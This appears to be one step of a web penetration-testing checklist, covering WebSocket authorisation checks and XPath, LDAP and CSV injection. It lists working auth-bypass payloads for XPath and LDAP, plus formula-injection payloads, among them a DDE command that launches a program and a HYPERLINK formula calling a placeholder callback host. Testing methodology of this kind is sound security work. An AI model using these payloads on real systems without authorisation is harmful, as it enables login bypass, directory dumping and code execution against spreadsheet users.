# Batch 08 — WebSockets + XPath / LDAP / CSV injection

## GOAL
Finish **4 checks**: Web Sockets, XPath Injection, LDAP Injection, CSV Injection.

## TIME
1–2 hours

## YOU NEED
- Proxy that supports WS (Burp)  
- Features: search, login directory, export CSV  

---

## WHY (30 seconds)

**WebSocket** = long-lived channel; often **weak auth** and no CSRF-like checks.  
**XPath** = XML query language; injection = bypass login / read nodes.  
**LDAP** = directory login/search; injection = auth bypass.  
**CSV injection** = export opens in Excel; cells starting with `= + - @` become formulas (steal data / code when user opens file).

---

## DO THIS

### A) Web Sockets

1. Browse app → Burp **WebSockets history**.  
2. For each WS URL:

```text
- Connect without cookies / without token?
- Replay message after logout?
- Spoof user id inside JSON message?
- XSS in messages reflected to other users?
```

3. Repeater → WebSocket → change ids:

```json
{"action":"getMessage","id":1}
{"action":"getMessage","id":2}
```

4. Try extra messages not in UI (fuzz action names).

**Win:** unauth read/write, IDOR over WS, stored XSS via messages.

### B) XPath Injection

Where XML accounts or filters exist (older apps, some SSO):

```text
' or '1'='1
" or "1"="1
' or count(parent::*[position()=1])=0 or 'a'='b
```

Login-style:

```text
username: ' or '1'='1
password: anything
```

**Win:** auth bypass or extra XML nodes in response.

### C) LDAP Injection

Login / search employee directory:

```text
*
*)(&
*)(|(&
admin)(&)
admin*)((|userpassword=*)
```

```text
username=*
username=admin*
username=*)(uid=*))(|(uid=*
```

**Win:** login as admin / dump directory entries.

### D) CSV Injection

1. Find **export CSV** (users, orders, reports).  
2. As user, set a field you control (name, address, note) to:

```text
=cmd|' /C calc'!A0
=1+1
=HYPERLINK("http://YOUR-OAST/","click")
+1+1
-1+1
@SUM(1+1)
```

3. Export CSV as victim admin or open in spreadsheet carefully (lab VM).

**Win:** formula preserved in CSV; opens as formula in Excel/LibreOffice.

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| No WebSocket | Mark N/A |
| No CSV export | Mark N/A |
| LDAP login only | Focus auth bypass payloads |

---

## NEXT
→ [09-jwt-oauth.md](./09-jwt-oauth.md)
